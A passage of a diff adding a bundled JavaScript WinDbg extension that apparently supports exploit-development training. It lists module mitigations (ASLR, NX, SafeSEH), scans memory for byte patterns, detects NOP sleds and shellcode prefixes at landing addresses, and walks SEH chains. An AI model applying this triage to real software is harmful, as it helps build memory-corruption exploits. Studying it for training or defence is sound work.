+      return __bi(Math.max(0, Math.trunc(value)));
+    }
+    if (typeof value === "string") {
+      return parseBigIntString(value);
+    }
+    if (value && typeof value === "object") {
+      const valueOf = value.valueOf;
+      if (typeof valueOf === "function") {
+        const resolved = valueOf.call(value);
+        if (resolved !== value) {
+          const parsed = toBigInt(resolved);
+          if (parsed !== __bi(0)) {
+            return parsed;
+          }
+        }
+      }
+      const asString = value.toString;
+      if (typeof asString === "function") {
+        return parseBigIntString(asString.call(value));
+      }
+    }
+    return __bi(0);
+  }
+  function asArray(value) {
+    if (Array.isArray(value)) {
+      return value;
+    }
+    if (value && typeof value[Symbol.iterator] === "function") {
+      try {
+        return Array.from(value);
+      } catch (_error) {
+        return [];
+      }
+    }
+    return [];
+  }
+  function parseSafeSeh(base, pe, optionalHeaderMagic) {
+    if (optionalHeaderMagic !== 267) {
+      return "unknown";
+    }
+    try {
+      const optionalHeaderOffset = pe + __bi(24);
+      const dataDirectoryOffset = optionalHeaderOffset + __bi(96);
+      const loadConfigRva = readUint32LE(dataDirectoryOffset + __bi(8 * 10));
+      const loadConfigSize = readUint32LE(dataDirectoryOffset + __bi(8 * 10 + 4));
+      if (loadConfigRva === 0 || loadConfigSize === 0) {
+        return "disabled";
+      }
+      const loadConfig = base + __bi(loadConfigRva);
+      const sehTable = readUint32LE(loadConfig + __bi(64));
+      const sehCount = readUint32LE(loadConfig + __bi(68));
+      if (sehTable !== 0 && sehCount > 0) {
+        return "enabled";
+      }
+      return "disabled";
+    } catch (_error) {
+      return "unknown";
+    }
+  }
+  function listModulesWithMitigations(filter) {
+    const process = host.currentProcess;
+    const modules = asArray(process == null ? void 0 : process.Modules);
+    const listed = modules.map((entry) => {
+      var _a, _b, _c, _d, _e;
+      const module = entry;
+      const name = (_a = module.Name) != null ? _a : "<unknown>";
+      const path = (_b = module.Path) != null ? _b : name;
+      const base = toBigInt((_d = (_c = module.BaseAddress) != null ? _c : module.Base) != null ? _d : module.Address);
+      let size = toBigInt((_e = module.Size) != null ? _e : module.Length);
+      const end = toBigInt(module.EndAddress);
+      if (size === __bi(0) && end > base) {
+        size = end - base;
+      }
+      let characteristics = 0;
+      let dllCharacteristics = 0;
+      let aslr = "unknown";
+      let nxcompat = "unknown";
+      let safeseh = "unknown";
+      let preferredBase = base;
+      try {
+        const mz = readUint16LE(base);
+        if (mz === 23117) {
+          const peOffset = readUint32LE(base + __bi(60));
+          const pe = base + __bi(peOffset);
+          const sig = readUint32LE(pe);
+          if (sig === 17744) {
+            characteristics = readUint16LE(pe + __bi(22));
+            const optionalHeaderMagic = readUint16LE(pe + __bi(24));
+            dllCharacteristics = readUint16LE(pe + __bi(94));
+            if (optionalHeaderMagic === 267) {
+              preferredBase = __bi(readUint32LE(pe + __bi(52)));
+            }
+            aslr = (dllCharacteristics & IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) !== 0 ? "enabled" : "disabled";
+            nxcompat = (dllCharacteristics & IMAGE_DLLCHARACTERISTICS_NX_COMPAT) !== 0 ? "enabled" : "disabled";
+            safeseh = parseSafeSeh(base, pe, optionalHeaderMagic);
+          }
+        }
+      } catch (_error) {
+      }
+      const system = path.toLowerCase().includes("\\windows\\system32");
+      return {
+        name,
+        path,
+        base,
+        size,
+        characteristics,
+        dllCharacteristics,
+        aslr,
+        nxcompat,
+        safeseh,
+        system,
+        preferredBase
+      };
+    }).filter((item) => {
+      if (!filter) {
+        return true;
+      }
+      const needle = filter.toLowerCase();
+      return item.name.toLowerCase().includes(needle) || item.path.toLowerCase().includes(needle);
+    }).sort((a, b) => a.base < b.base ? -1 : 1);
+    return listed;
+  }
+  function findModuleByAddress(address) {
+    return listModulesWithMitigations().find((module) => {
+      const start = module.base;
+      const end = module.base + module.size;
+      return address >= start && address < end;
+    });
+  }
+  function createModulesCommand() {
+    return {
+      name: "modules",
+      description: "Enumerate modules and mitigation states.",
+      usage: "dx @$osed().modules(filter?)",
+      examples: ["dx @$osed().modules()", 'dx @$osed().modules("kernel32")'],
+      schema: {
+        filter: { type: "string" }
+      },
+      execute(options) {
+        const modules = listModulesWithMitigations(options.filter);
+        const pointerSize = getPointerSize();
+        section("Modules");
+        table([
+          { key: "name", header: "Module", width: 20 },
+          { key: "base", header: "Base", width: 18 },
+          { key: "size", header: "Size", width: 10 },
+          { key: "aslr", header: "ASLR", width: 8 },
+          { key: "nxcompat", header: "NX_COMPAT", width: 10 },
+          { key: "safeseh", header: "SafeSEH", width: 8 },
+          { key: "system", header: "System", width: 8 }
+        ], modules.map((module) => ({
+          name: module.name,
+          base: formatAddress(module.base, pointerSize),
+          size: `0x${module.size.toString(16).toUpperCase()}`,
+          aslr: module.aslr,
+          nxcompat: module.nxcompat,
+          safeseh: module.safeseh,
+          system: module.system ? "yes" : "no"
+        })));
+        whyItMatters("Mitigation triage identifies practical modules for reliable exploitation paths.");
+        return {
+          command: "modules",
+          args: options,
+          success: true,
+          findings: modules,
+          warnings: [],
+          errors: []
+        };
+      }
+    };
+  }
+
+  // src/core/scan_engine.ts
+  var IMAGE_SCN_MEM_EXECUTE = 536870912;
+  function decodeAscii(bytes) {
+    let result3 = "";
+    for (const byte of bytes) {
+      if (byte === 0) {
+        break;
+      }
+      result3 += String.fromCharCode(byte);
+    }
+    return result3;
+  }
+  function parseBigIntString2(value) {
+    const text = value.trim();
+    if (/^0x[0-9a-fA-F]+$/.test(text)) {
+      return __bi(text);
+    }
+    if (/^[0-9a-fA-F]+$/.test(text)) {
+      return __bi(`0x${text}`);
+    }
+    if (/^[0-9]+$/.test(text)) {
+      return __bi(text);
+    }
+    return __bi(0);
+  }
+  function toBigInt2(value) {
+    if (typeof value === "bigint") {
+      return value;
+    }
+    if (typeof value === "number") {
+      return __bi(Math.max(0, Math.trunc(value)));
+    }
+    if (typeof value === "string") {
+      return parseBigIntString2(value);
+    }
+    if (value && typeof value === "object") {
+      const valueOf = value.valueOf;
+      if (typeof valueOf === "function") {
+        const resolved = valueOf.call(value);
+        if (resolved !== value) {
+          const parsed = toBigInt2(resolved);
+          if (parsed !== __bi(0)) {
+            return parsed;
+          }
+        }
+      }
+      const asString = value.toString;
+      if (typeof asString === "function") {
+        return parseBigIntString2(asString.call(value));
+      }
+    }
+    return __bi(0);
+  }
+  function asArray2(value) {
+    if (Array.isArray(value)) {
+      return value;
+    }
+    if (value && typeof value[Symbol.iterator] === "function") {
+      try {
+        return Array.from(value);
+      } catch (_error) {
+        return [];
+      }
+    }
+    return [];
+  }
+  function getModules() {
+    const process = host.currentProcess;
+    const modules = asArray2(process == null ? void 0 : process.Modules);
+    return modules.map((entry) => {
+      var _a, _b, _c, _d, _e, _f;
+      const module = entry;
+      const base = toBigInt2((_b = (_a = module.BaseAddress) != null ? _a : module.Base) != null ? _b : module.Address);
+      let size = toBigInt2((_c = module.Size) != null ? _c : module.Length);
+      const end = toBigInt2(module.EndAddress);
+      if (size === __bi(0) && end > base) {
+        size = end - base;
+      }
+      return {
+        name: (_d = module.Name) != null ? _d : "<unknown>",
+        path: (_f = (_e = module.Path) != null ? _e : module.Name) != null ? _f : "<unknown>",
+        base,
+        size
+      };
+    }).filter((module) => module.size > __bi(0)).sort((a, b) => a.base < b.base ? -1 : 1);
+  }
+  function parseSections(module) {
+    var _a;
+    const sections = [];
+    try {
+      const mz = readUint16LE(module.base);
+      if (mz !== 23117) {
+        return sections;
+      }
+      const peOffset = readUint32LE(module.base + __bi(60));
+      const pe = module.base + __bi(peOffset);
+      const sig = readUint32LE(pe);
+      if (sig !== 17744) {
+        return sections;
+      }
+      const sectionCount = readUint16LE(pe + __bi(6));
+      const optionalHeaderSize = readUint16LE(pe + __bi(20));
+      const sectionTable = pe + __bi(24) + __bi(optionalHeaderSize);
+      for (let i = 0; i < sectionCount; i += 1) {
+        const entry = sectionTable + __bi(i * 40);
+        const nameBytes = (_a = tryReadMemory(entry, 8)) != null ? _a : new Uint8Array();
+        const name = decodeAscii(nameBytes).replace(/\0+$/, "") || `.sec${i}`;
+        const virtualSize = readUint32LE(entry + __bi(8));
+        const virtualAddress = readUint32LE(entry + __bi(12));
+        const characteristics = readUint32LE(entry + __bi(36));
+        const executable = (characteristics & IMAGE_SCN_MEM_EXECUTE) !== 0;
+        if (virtualSize > 0) {
+          sections.push({
+            module,
+            name,
+            start: module.base + __bi(virtualAddress),
+            size: virtualSize,
+            executable
+          });
+        }
+      }
+    } catch (_error) {
+      return [];
+    }
+    return sections;
+  }
+  function matchesModuleFilter(module, filter) {
+    if (!filter) {
+      return true;
+    }
+    const needle = filter.toLowerCase();
+    return module.name.toLowerCase().includes(needle) || module.path.toLowerCase().includes(needle);
+  }
+  function forEachSection(options) {
+    const warnings = [];
+    const sections = [];
+    const matchingModules = getModules().filter((item) => matchesModuleFilter(item, options.module));
+    if (matchingModules.length === 0) {
+      warnings.push(options.module ? `No loaded modules matched '${options.module}'.` : "No loaded modules were available to scan.");
+    }
+    for (const module of matchingModules) {
+      const parsed = parseSections(module);
+      if (parsed.length === 0) {
+        warnings.push(`Could not parse PE sections for module ${module.name}.`);
+        continue;
+      }
+      for (const section2 of parsed) {
+        if (!options.executableOnly || section2.executable) {
+          sections.push(section2);
+        }
+      }
+    }
+    if (matchingModules.length > 0 && sections.length === 0 && warnings.length === 0) {
+      warnings.push(options.executableOnly ? "Matched modules contained no executable PE sections." : "Matched modules contained no scannable PE sections.");
+    }
+    sections.sort((a, b) => a.start < b.start ? -1 : 1);
+    return { sections, warnings };
+  }
+  function scanPattern(options, pattern) {
+    const hits = [];
+    const seenHits = /* @__PURE__ */ new Set();
+    const warnings = [];
+    const normalizedChunk = Math.max(4096, Math.min(16384, options.chunkSize));
+    const normalizedMax = Math.min(options.maxResults, 5e3);
+    const scope = forEachSection(__spreadProps(__spreadValues({}, options), {
+      chunkSize: normalizedChunk,
+      maxResults: normalizedMax
+    }));
+    for (const warning of scope.warnings) {
+      warnings.push({ region: "module", message: warning });
+    }
+    let chunksRead = 0;
+    let chunksSkipped = 0;
+    for (const section2 of scope.sections) {
+      for (let offset = 0; offset < section2.size; offset += normalizedChunk) {
+        const chunkStart = section2.start + __bi(offset);
+        const remaining = section2.size - offset;
+        const size = Math.max(0, Math.min(remaining, normalizedChunk + pattern.length - 1));
+        if (size < pattern.length) {
+          continue;
+        }
+        const bytes = tryReadMemory(chunkStart, size);
+        if (!bytes) {
+          chunksSkipped += 1;
+          warnings.push({
+            region: `${section2.module.name}:${section2.name}`,
+            message: `Unreadable memory at chunk offset 0x${offset.toString(16).toUpperCase()}.`
+          });
+          continue;
+        }
+        chunksRead += 1;
+        const last = bytes.length - pattern.length;
+        for (let i = 0; i <= last; i += 1) {
+          let matched = true;
+          for (let j = 0; j < pattern.length; j += 1) {
+            if (bytes[i + j] !== pattern[j]) {
+              matched = false;
+              break;
+            }
+          }
+          if (matched) {
+            const hit = chunkStart + __bi(i);
+            const hitKey = hit.toString();
+            if (seenHits.has(hitKey)) {
+              continue;
+            }
+            seenHits.add(hitKey);
+            hits.push(hit);
+            if (hits.length >= normalizedMax) {
+              return {
+                hits: hits.sort((a, b) => a < b ? -1 : 1),
+                warnings,
+                stats: {
+                  sectionsScanned: scope.sections.length,
+                  chunksRead,
+                  chunksSkipped,
+                  results: hits.length,
+                  stoppedEarly: 1
+                }
+              };
+            }
+          }
+        }
+      }
+    }
+    return {
+      hits: hits.sort((a, b) => a < b ? -1 : 1),
+      warnings,
+      stats: {
+        sectionsScanned: scope.sections.length,
+        chunksRead,
+        chunksSkipped,
+        results: hits.length,
+        stoppedEarly: 0
+      }
+    };
+  }
+
+  // src/analysis/pattern_evidence.ts
+  function analyzePatternEvidence(address, bytes, maxWindow = 32) {
+    const text = String.fromCharCode(...bytes);
+    for (const candidate of [
+      { family: "msf", value: generateMsfPattern(20280) },
+      { family: "cyclic", value: generateCyclicPattern(2e4) }
+    ]) {
+      for (let length = Math.min(bytes.length, maxWindow); length >= 8; length -= 1) {
+        for (let offset = 0; offset <= text.length - length; offset += 1) {
+          const patternOffset = candidate.value.indexOf(text.slice(offset, offset + length));
+          if (patternOffset >= 0)
+            return { address: address + __bi(offset), patternFamily: candidate.family, matched: true, matchLength: length, patternOffset, confidence: 0.9, source: "sampled-memory" };
+        }
+      }
+    }
+    return { address, patternFamily: null, matched: false, matchLength: 0, patternOffset: null, confidence: 0, source: "sampled-memory" };
+  }
+
+  // src/analysis/memory.ts
+  var PAGE_NOACCESS = 1;
+  var PAGE_READONLY = 2;
+  var PAGE_READWRITE = 4;
+  var PAGE_WRITECOPY = 8;
+  var PAGE_EXECUTE = 16;
+  var PAGE_EXECUTE_READ = 32;
+  var PAGE_EXECUTE_READWRITE = 64;
+  var PAGE_EXECUTE_WRITECOPY = 128;
+  var PAGE_GUARD = 256;
+  var MEM_COMMIT = 4096;
+  var MEM_RESERVE = 8192;
+  var MEM_FREE = 65536;
+  var MEM_PRIVATE = 131072;
+  var MEM_MAPPED = 262144;
+  var MEM_IMAGE = 16777216;
+  function protectionBase(protection) {
+    return protection & 255;
+  }
+  function formatAddressValue(value) {
+    return `0x${value.toString(16).toUpperCase().padStart(16, "0")}`;
+  }
+  function serializeMemoryRegionEvidence(evidence) {
+    return {
+      address: formatAddressValue(evidence.address),
+      baseAddress: evidence.baseAddress === void 0 ? void 0 : formatAddressValue(evidence.baseAddress),
+      allocationBase: evidence.allocationBase === void 0 ? void 0 : formatAddressValue(evidence.allocationBase),
+      regionSize: evidence.regionSize === void 0 ? void 0 : `0x${evidence.regionSize.toString(16).toUpperCase()}`,
+      readable: evidence.readable,
+      writable: evidence.writable,
+      executable: evidence.executable,
+      guarded: evidence.guarded,
+      noAccess: evidence.noAccess,
+      committed: evidence.committed,
+      state: evidence.state,
+      regionType: evidence.regionType,
+      raw: __spreadValues({}, evidence.raw),
+      source: evidence.source,
+      warnings: [...evidence.warnings]
+    };
+  }
+  function normalizeMemoryRegion(address, raw, source = "vprot") {
+    const protection = raw.protection;
+    const base = protection === void 0 ? void 0 : protectionBase(protection);
+    const knownProtection = base !== void 0 && [
+      PAGE_NOACCESS,
+      PAGE_READONLY,
+      PAGE_READWRITE,
+      PAGE_WRITECOPY,
+      PAGE_EXECUTE,
+      PAGE_EXECUTE_READ,
+      PAGE_EXECUTE_READWRITE,
+      PAGE_EXECUTE_WRITECOPY
+    ].includes(base);
+    const readable = !knownProtection ? null : [PAGE_READONLY, PAGE_READWRITE, PAGE_WRITECOPY, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_WRITECOPY].includes(base);
+    const writable = !knownProtection ? null : [PAGE_READWRITE, PAGE_WRITECOPY, PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_WRITECOPY].includes(base);
+    const executable = !knownProtection ? null : [PAGE_EXECUTE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_WRITECOPY].includes(base);
+    let regionType = "unknown";
+    if (raw.type === MEM_IMAGE)
+      regionType = "image";
+    else if (raw.type === MEM_MAPPED)
+      regionType = "mapped";
+    else if (raw.type === MEM_PRIVATE)
+      regionType = "private";
+    const state = raw.state === MEM_COMMIT ? "commit" : raw.state === MEM_RESERVE ? "reserve" : raw.state === MEM_FREE ? "free" : "unknown";
+    return {
+      address,
+      baseAddress: raw.baseAddress,
+      allocationBase: raw.allocationBase,
+      regionSize: raw.regionSize,
+      readable,
+      writable,
+      executable,
+      guarded: protection === void 0 ? null : (protection & PAGE_GUARD) !== 0,
+      noAccess: !knownProtection ? null : base === PAGE_NOACCESS,
+      committed: raw.state === void 0 ? null : raw.state === MEM_COMMIT,
+      state,
+      regionType,
+      raw: {
+        state: raw.state,
+        protection: raw.protection,
+        allocationProtection: raw.allocationProtection,
+        type: raw.type
+      },
+      source,
+      warnings: []
+    };
+  }
+  function toArray(value) {
+    if (Array.isArray(value))
+      return value;
+    if (value && typeof value[Symbol.iterator] === "function") {
+      try {
+        return Array.from(value);
+      } catch (_error) {
+        return [];
+      }
+    }
+    return [];
+  }
+  function parseHexValue(value) {
+    const cleaned = value.replace(/`/g, "");
+    return /^[0-9a-f]+$/i.test(cleaned) ? __bi(`0x${cleaned}`) : void 0;
+  }
+  function parseVprot(lines) {
+    const fields = /* @__PURE__ */ new Map();
+    for (const line of lines) {
+      const match = line.match(/^\s*(BaseAddress|AllocationBase|RegionSize|State|Protect|AllocationProtect|Type):\s+([0-9a-f`]+)/i);
+      if (!match)
+        continue;
+      const value = parseHexValue(match[2]);
+      if (value !== void 0)
+        fields.set(match[1].toLowerCase(), value);
+    }
+    const asNumber = (key2) => {
+      const value = fields.get(key2);
+      return value === void 0 ? void 0 : Number(__bi.and(value, __bi(4294967295)));
+    };
+    return {
+      baseAddress: fields.get("baseaddress"),
+      allocationBase: fields.get("allocationbase"),
+      regionSize: fields.get("regionsize"),
+      state: asNumber("state"),
+      protection: asNumber("protect"),
+      allocationProtection: asNumber("allocationprotect"),
+      type: asNumber("type")
+    };
+  }
+  function memoryRegion(address) {
+    var _a, _b, _c;
+    try {
+      const hostAny = host;
+      const control = (_c = (_b = (_a = hostAny.namespace) == null ? void 0 : _a.Debugger) == null ? void 0 : _b.Utility) == null ? void 0 : _c.Control;
+      const execute = control == null ? void 0 : control.ExecuteCommand;
+      if (typeof execute !== "function")
+        throw new Error("WinDbg command execution is unavailable.");
+      const result3 = execute.call(control, `!vprot 0x${address.toString(16)}`);
+      const raw = parseVprot(toArray(result3).map(String));
+      if (raw.protection === void 0 && raw.state === void 0 && raw.type === void 0) {
+        throw new Error("WinDbg returned no recognizable memory metadata.");
+      }
+      return normalizeMemoryRegion(address, raw);
+    } catch (error2) {
+      const evidence = normalizeMemoryRegion(address, {}, "unavailable");
+      evidence.warnings.push(error2 instanceof Error ? error2.message : String(error2));
+      return evidence;
+    }
+  }
+
+  // src/analysis/landing.ts
+  var POSITIVE_OBSERVATION_KINDS = /* @__PURE__ */ new Set([
+    "nop_sled_detected",
+    "repeated_marker_bytes",
+    "cyclic_pattern_match",
+    "payload_like_bytes",
+    "known_payload_prefix",
+    "executable_region"
+  ]);
+  function formatAddressValue2(value) {
+    return `0x${value.toString(16).toUpperCase().padStart(16, "0")}`;
+  }
+  function serializeUnknown(value) {
+    if (typeof value === "bigint")
+      return formatAddressValue2(value);
+    if (Array.isArray(value))
+      return value.map(serializeUnknown);
+    if (value && typeof value === "object") {
+      const out = {};
+      for (const [key2, entry] of Object.entries(value)) {
+        out[key2] = serializeUnknown(entry);
+      }
+      return out;
+    }
+    return value;
+  }
+  function serializeLandingEvidence(evidence) {
+    return {
+      address: evidence.address === void 0 ? void 0 : formatAddressValue2(evidence.address),
+      memory: evidence.memory === void 0 ? void 0 : serializeMemoryRegionEvidence(evidence.memory),
+      bytes: [...evidence.bytes],
+      requestedBytes: evidence.requestedBytes,
+      observations: evidence.observations.map((item) => ({
+        kind: item.kind,
+        confidence: item.confidence,
+        address: item.address === void 0 ? void 0 : formatAddressValue2(item.address),
+        length: item.length,
+        details: serializeUnknown(item.details)
+      })),
+      confidence: evidence.confidence,
+      recommendation: evidence.recommendation
+    };
+  }
+  function calculateLandingConfidence(observations) {
+    const contributions = observations.filter((item) => POSITIVE_OBSERVATION_KINDS.has(item.kind)).map((item) => Math.max(0, Math.min(1, Number.isFinite(item.confidence) ? item.confidence : 0))).sort((left, right) => left - right);
+    if (contributions.length === 0)
+      return 0;
+    return Math.max(0, Math.min(1, contributions.reduce((sum, value) => sum + value, 0) / 2));
+  }
+  function observation(kind, confidence, address, offset, length, details = {}) {
+    return { kind, confidence, address: address + __bi(offset), length, details: __spreadValues({ offset }, details) };
+  }
+  function repeatedRuns(bytes, minimum = 4) {
+    const runs = [];
+    for (let start = 0; start < bytes.length; ) {
+      let end = start + 1;
+      while (end < bytes.length && bytes[end] === bytes[start])
+        end += 1;
+      if (end - start >= minimum)
+        runs.push({ byte: bytes[start], offset: start, length: end - start });
+      start = end;
+    }
+    return runs;
+  }
+  function analyzeLandingBytes(address, bytes, memory, requestedBytes = bytes.length, disassemblySucceeded = null) {
+    const observations = [];
+    const runs = repeatedRuns(bytes);
+    for (const run of runs) {
+      if (run.byte === 144 && run.length >= 8) {
+        observations.push(observation("nop_sled_detected", 0.95, address, run.offset, run.length, { byte: run.byte }));
+      } else if ([65, 66, 67, 68].includes(run.byte)) {
+        observations.push(observation("repeated_marker_bytes", 0.8, address, run.offset, run.length, { byte: run.byte }));
+      } else {
+        observations.push(observation("repeated_byte_run", 0.45, address, run.offset, run.length, { byte: run.byte }));
+      }
+    }
+    const patternEvidence = analyzePatternEvidence(address, bytes);
+    if (patternEvidence.matched)
+      observations.push(observation("cyclic_pattern_match", patternEvidence.confidence, address, Number(patternEvidence.address - address), patternEvidence.matchLength, { pattern: patternEvidence.patternFamily, patternOffset: patternEvidence.patternOffset }));
+    for (let offset = 0; offset <= bytes.length - 32; offset += 4) {
+      const window = bytes.slice(offset, offset + 32);
+      let zeroes = 0;
+      let printable = 0;
+      for (const byte of window) {
+        if (byte === 0)
+          zeroes += 1;
+        if (byte >= 32 && byte <= 126)
+          printable += 1;
+      }
+      if (zeroes <= 1 && printable <= 8) {
+        observations.push(observation("payload_like_bytes", 0.4, address, offset, window.length, { zeroes, printable }));
+      }
+    }
+    const prefixes = [
+      { name: "x86_cld_call", bytes: [252, 232] },
+      { name: "x86_getpc_fnstenv", bytes: [217, 238, 217, 116, 36, 244] }
+    ];
+    for (const prefix of prefixes) {
+      if (prefix.bytes.every((value, index) => bytes[index] === value)) {
+        observations.push(observation("known_payload_prefix", 0.65, address, 0, prefix.bytes.length, { prefix: prefix.name }));
+      }
+    }
+    if (memory.readable !== null)
+      observations.push(observation(memory.readable ? "readable_region" : "unreadable_region", 1, address, 0, bytes.length));
+    if (memory.executable !== null)
+      observations.push(observation(memory.executable ? "executable_region" : "non_executable_region", 1, address, 0, bytes.length));
+    if (disassemblySucceeded !== null)
+      observations.push(observation(disassemblySucceeded ? "disassembly_succeeded" : "disassembly_failed", 0.8, address, 0, Math.min(bytes.length, 16)));
+    if (bytes.length < requestedBytes)
+      observations.push(observation(bytes.length === 0 ? "bytes_inaccessible" : "bytes_truncated", 1, address, bytes.length, requestedBytes - bytes.length, { requestedBytes, actualBytes: bytes.length }));
+    const positive = observations.filter((item) => POSITIVE_OBSERVATION_KINDS.has(item.kind));
+    const confidence = calculateLandingConfidence(observations);
+    const recommendation = memory.executable === false ? "Execution from this page will fault; redirect to executable memory or change the staging strategy." : bytes.length === 0 ? "The landing bytes are inaccessible; verify the address and debugger context." : positive.length > 0 ? "The address has payload-like evidence; validate control flow and the complete byte sequence." : "No strong landing signal was found in the sampled bytes.";
+    return { address, memory, bytes: Array.from(bytes), requestedBytes, observations, confidence, recommendation, patternEvidence };
+  }
+  function stackPointer() {
+    var _a, _b, _c;
+    const thread = host.currentThread;
+    const registers = (_b = (_a = thread == null ? void 0 : thread.Registers) == null ? void 0 : _a.User) != null ? _b : thread == null ? void 0 : thread.Registers;
+    const names = getPointerSize() === 8 ? ["rsp", "esp"] : ["esp", "rsp"];
+    for (const name of names) {
+      const value = (_c = registers == null ? void 0 : registers[name]) != null ? _c : registers == null ? void 0 : registers[name.toUpperCase()];
+      if (typeof value === "bigint")
+        return value;
+      if (typeof value === "number" && Number.isFinite(value))
+        return __bi(Math.trunc(value));
+      if (typeof value === "string" && /^(0x)?[0-9a-f`]+$/i.test(value))
+        return __bi(`0x${value.replace(/^0x/i, "").replace(/`/g, "")}`);
+      if (value && typeof value === "object") {
+        try {
+          const rendered = String(value);
+          if (/^(0x)?[0-9a-f`]+$/i.test(rendered))
+            return __bi(`0x${rendered.replace(/^0x/i, "").replace(/`/g, "")}`);
+        } catch (_error) {
+        }
+      }
+    }
+    return void 0;
+  }
+  function readAvailablePrefix(address, requestedBytes) {
+    const complete = tryReadMemory(address, requestedBytes);
+    if (complete)
+      return complete;
+    let low = 0;
+    let high = requestedBytes - 1;
+    let available = new Uint8Array();
+    while (low <= high) {
+      const length = Math.floor((low + high) / 2);
+      if (length === 0) {
+        low = 1;
+        continue;
+      }
+      const bytes = tryReadMemory(address, length);
+      if (bytes) {
+        available = bytes;
+        low = length + 1;
+      } else {
+        high = length - 1;
+      }
+    }
+    return available;
+  }
+  function canDisassemble(address) {
+    var _a, _b, _c;
+    try {
+      const hostAny = host;
+      const control = (_c = (_b = (_a = hostAny.namespace) == null ? void 0 : _a.Debugger) == null ? void 0 : _b.Utility) == null ? void 0 : _c.Control;
+      if (typeof (control == null ? void 0 : control.ExecuteCommand) !== "function")
+        return null;
+      const lines = Array.from(control.ExecuteCommand.call(control, `u 0x${address.toString(16)} L1`)).map(String);
+      return lines.some((line) => /\b[0-9a-f`]+\s+[0-9a-f]{2}/i.test(line)) && !lines.some((line) => /memory access error|could not be read|unable to/i.test(line));
+    } catch (_error) {
+      return null;
+    }
+  }
+  function landing(address, requestedBytes = 64) {
+    const target = address != null ? address : stackPointer();
+    if (target === void 0) {
+      return { bytes: [], requestedBytes, observations: [], confidence: 0, recommendation: "Stack pointer is unavailable; provide an explicit address." };
+    }
+    const memory = memoryRegion(target);
+    const bytes = readAvailablePrefix(target, requestedBytes);
+    return analyzeLandingBytes(target, bytes, memory, requestedBytes, canDisassemble(target));
+  }
+
+  // src/analysis/seh.ts
+  function safeGet(value, key2) {
+    if (!value || typeof value !== "object")
+      return void 0;
+    try {
+      return value[key2];
+    } catch (_error) {
+      return void 0;
+    }
+  }
+  function safeKeys(value) {
+    if (!value || typeof value !== "object")
+      return [];
+    try {
+      return Object.keys(value);
+    } catch (_error) {
+      return [];
+    }
+  }
+  function toAddress(value) {
+    if (typeof value === "bigint")
+      return value;
+    if (typeof value === "number" && Number.isFinite(value))
+      return __bi(Math.max(0, Math.trunc(value)));
+    if (typeof value === "string") {
+      const text = value.trim();
+      const embeddedHex = text.match(/0x[0-9a-fA-F]+/);
+      if (embeddedHex)
+        return __bi(embeddedHex[0]);
+      if (/^[0-9a-fA-F]+$/.test(text))
+        return __bi(`0x${text}`);
+    }
+    if (value && typeof value === "object") {
+      for (const key2 of ["targetLocation", "address", "Address", "Value", "value"]) {
+        const parsed = toAddress(safeGet(value, key2));
+        if (parsed !== __bi(0))
+          return parsed;
+      }
+      try {
+        const valueOf = safeGet(value, "valueOf");
+        if (typeof valueOf === "function") {
+          const resolved = valueOf.call(value);
+          if (resolved !== value) {
+            const parsed = toAddress(resolved);
+            if (parsed !== __bi(0))
+              return parsed;
+          }
+        }
+      } catch (_error) {
+      }
+      try {
+        const toString = safeGet(value, "toString");
+        if (typeof toString === "function")
+          return toAddress(toString.call(value));
+      } catch (_error) {
+      }
+    }
+    return __bi(0);
+  }
+  function signedInteger(value) {
+    if (typeof value === "number" && Number.isFinite(value))
+      return Math.trunc(value);
+    if (typeof value === "bigint")
+      return Number(value);
+    const text = typeof value === "string" ? value : String(value != null ? value : "");
+    const match = text.match(/-?[0-9]+/);
+    return match ? parseInt(match[0], 10) : 0;
+  }
+  function environmentTeb(thread) {
+    for (const environment of [safeGet(thread, "Environment"), safeGet(thread, "NativeEnvironment")]) {
+      const block = safeGet(environment, "EnvironmentBlock");
+      if (!block || typeof block !== "object")
+        continue;
+      const direct = toAddress(safeGet(block, "Self"));
+      if (direct !== __bi(0))
+        return direct;
+      const ntTib = safeGet(block, "NtTib");
+      const nativeSelf = toAddress(safeGet(ntTib, "Self"));
+      const wowOffset = signedInteger(safeGet(block, "WowTebOffset"));
+      if (nativeSelf !== __bi(0) && wowOffset !== 0)
+        return nativeSelf + __bi(wowOffset);
+      if (nativeSelf !== __bi(0))
+        return nativeSelf;
+    }
+    return __bi(0);
+  }
+  function candidates(value, depth = 0) {
+    if (depth > 2 || value === null || value === void 0)
+      return [];
+    const found = /* @__PURE__ */ new Set();
+    const direct = toAddress(value);
+    if (direct !== __bi(0))
+      found.add(direct);
+    if (typeof value === "object") {
+      for (const key2 of safeKeys(value)) {
+        for (const item of candidates(safeGet(value, key2), depth + 1))
+          found.add(item);
+      }
+    }
+    return [...found];
+  }
+  function looksLikeTeb32(address, reader) {
+    try {
+      if (address < __bi(4096) || reader(address + __bi(24), 4) !== address)
+        return false;
+      const head = reader(address, 4);
+      return head !== __bi(0) && head !== __bi(4294967295);
+    } catch (_error) {
+      return false;
+    }
+  }
+  function debuggerTebPseudoRegister() {
+    try {
+      for (const line of executeDebuggerCommand("? @$teb")) {
+        const match = line.match(/=\s*([0-9a-f`]+)\s*$/i);
+        if (match)
+          return __bi(`0x${match[1].replace(/`/g, "")}`);
+      }
+    } catch (_error) {
+    }
+    return void 0;
+  }
+  var WOW64_TEB_DISTANCE = __bi(8192);
+  function resolveTeb32Address(thread, reader = readPointer, debuggerTeb = debuggerTebPseudoRegister) {
+    const fromEnvironment = environmentTeb(thread);
+    if (fromEnvironment !== __bi(0))
+      return fromEnvironment;
+    const teb = debuggerTeb();
+    if (teb !== void 0) {
+      const fromPseudoRegister = [teb, teb + WOW64_TEB_DISTANCE].find((candidate) => looksLikeTeb32(candidate, reader));
+      if (fromPseudoRegister !== void 0)
+        return fromPseudoRegister;
+    }
+    for (const key2 of ["Teb", "Teb32", "TebAddress", "Wow64Teb", "Wow64Teb32"]) {
+      const parsed = toAddress(safeGet(thread, key2));
+      if (parsed !== __bi(0))
+        return parsed;
+    }
+    for (const key2 of safeKeys(thread)) {
+      if (/teb/i.test(key2)) {
+        const parsed = toAddress(safeGet(thread, key2));
+        if (parsed !== __bi(0))
+          return parsed;
+      }
+    }
+    return candidates(thread).find((candidate) => looksLikeTeb32(candidate, reader));
+  }
+  function walkSehRecords(teb, maxRecords = 64, reader = readPointer) {
+    const records = [];
+    let node;
+    try {
+      node = reader(teb, 4);
+    } catch (error2) {
